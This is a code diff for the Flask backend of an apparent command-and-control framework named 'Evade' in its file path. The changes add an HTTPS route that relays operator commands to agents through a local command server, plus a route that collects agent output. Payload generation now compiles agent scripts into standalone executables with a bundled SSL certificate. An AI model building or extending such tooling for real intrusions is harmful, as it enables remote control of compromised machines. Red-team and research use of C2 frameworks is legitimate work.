@@ -114,10 +114,10 @@ def execute_command():
 
     return jsonify({'status': 'Command sent to TCP server', 'response': response}), 200
 
-@app.route('/api/execute-command/HTTP', methods=['POST'])
+@app.route('/api/execute-command/HTTP', methods=['POST'], endpoint='execute_command_http')
 def execute_command_http():
-    data = request.get_json()  # Get data from the incoming request
-    agent_id = data.get('agentId')  # Use lower case for JSON keys
+    data = request.get_json()
+    agent_id = data.get('agentId')
     command = data.get('command')
     print(data)
     if not agent_id or not command:
@@ -131,16 +131,40 @@ def execute_command_http():
         response = requests.post(endpoint, json=data, headers=headers)
         print(f"Data sent to {endpoint}: {data}")
         print(f"Response from server: {response.text}")
-        return jsonify({'message': 'Data sent successfully', 'response':'Executed successfully'}), 200
+        return jsonify({'message': 'Data sent successfully', 'response': 'Executed successfully'}), 200
     except requests.exceptions.RequestException as e:
         print(f"Failed to send data: {str(e)}")
         return jsonify({'error': 'Failed to communicate with command server'}), 500
 
+@app.route('/api/execute-command/HTTPS', methods=['POST'], endpoint='execute_command_https')
+def https():
+    data = request.get_json()
+    agent_id = data.get('agentId')
+    command = data.get('command')
+    print(data)
+    if not agent_id or not command:
+        return jsonify({'error': 'Missing required fields: agent_id or command'}), 400
 
-@app.route('/api/execute-command/HTTPS', methods=['POST'])
-def execute_command_https():
-    # Specific logic for handling HTTPS commands
-    pass
+    # Prepare data for the outgoing request
+    endpoint = "http://127.0.0.1:5678/send_command"
+    headers = {'Content-Type': 'application/json'}
+
+    try:
+        response = requests.post(endpoint, json=data, headers=headers)
+        print(f"Data sent to {endpoint}: {data}")
+        print(f"Response from server: {response.text}")
+        return jsonify({'message': 'Data sent successfully', 'response': 'Executed successfully'}), 200
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send data: {str(e)}")
+        return jsonify({'error': 'Failed to communicate with command server'}), 500
+
+@app.route('/api/receive-results', methods=['POST'])
+def receive_results():
+    data = request.get_json()
+    print("Received data from HTTP server:", data)
+    socketio.emit('output_received', {'http_output': data})
+    # Here you can forward this data to the frontend using any method (WebSockets)
+    return jsonify({'status': 'Success', 'data': data}), 200
 
 # Flask route to handle file uploads in your backend
 @app.route('/upload', methods=['POST'])
@@ -496,15 +520,37 @@ def generate_payload():
     print("Filename ma pugyo")
     print("----------------------------------------------")
     # Save the generated code to a file
-    filename = f"{name}_{str(uuid.uuid4())}{'.py' if payload_type == '.py' else '.exe'}"
+    filename = f"{name}_{protocol}{'.py' if payload_type == '.py' else '.exe'}"
     filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
     with open(filepath, 'w') as file:
         file.write(agent_code)
 
-    # Compile to .exe if needed
+    ip_sanitized = lhost.replace(".", "_")  # Sanitize the IP address for file naming
+    cert_dir = os.path.join(r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\Servers\https\certs', ip_sanitized)
+    print(cert_dir)
+
     if payload_type == '.exe':
         try:
-            subprocess.run(['pyinstaller', '--onefile', '--distpath', app.config['UPLOAD_FOLDER'], '--name', filename, filepath], check=True)
+            # Build the basic PyInstaller command
+            pyinstaller_command = [
+                'pyinstaller', 
+                '--onefile', 
+                '--distpath', app.config['UPLOAD_FOLDER'], 
+                '--name', filename, 
+                filepath
+            ]
+            
+            # If the protocol is HTTPS, add the SSL certificate to the build
+            if protocol.lower() == "https":
+                cert_path = os.path.join(cert_dir, 'server.crt')  # Assuming cert_dir is defined earlier in your code
+                print(cert_path)
+                # Add the SSL certificate as a data file
+                pyinstaller_command.extend([
+                    '--add-data', 
+                    f"{cert_path};."  # Syntax: 'path/to/source;path/in/exe'
+                ])
+            # Run the PyInstaller command
+            subprocess.run(pyinstaller_command, check=True)
         except subprocess.CalledProcessError as e:
             logging.error(f"Failed to compile .exe file: {e}")
             return jsonify({"error": "Failed to compile .exe file"}), 500
